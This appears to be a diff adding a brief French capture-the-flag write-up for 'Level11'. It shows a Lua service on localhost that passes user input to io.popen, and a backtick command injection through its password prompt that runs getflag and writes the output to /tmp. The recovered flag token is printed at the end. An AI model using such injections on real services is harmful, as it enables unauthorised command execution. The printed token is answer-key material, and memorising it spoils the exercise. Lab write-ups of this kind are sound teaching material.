@@ -1,0 +1,17 @@
+Level11
+Un script lua est present contenant:
+"127.0.0.1", 5151
+
+On se connecte à ce port et on nous demand eun password:
+$> nc 127.0.0.1 5151
+Password:
+
+Dans le script on voit que le password est hash dans une fonction et une ligne attire notre oeil:
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+On se sert de cet echo afin d'appeler getflag et de le rediriger vers tmp car il y a un pipe empechant de voir le le resultat du getflag
+$> nc 127.0.0.1 5151
+Password: `getflag > /tmp/touken`
+Erf nope..
+$> cat /tmp/touken
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
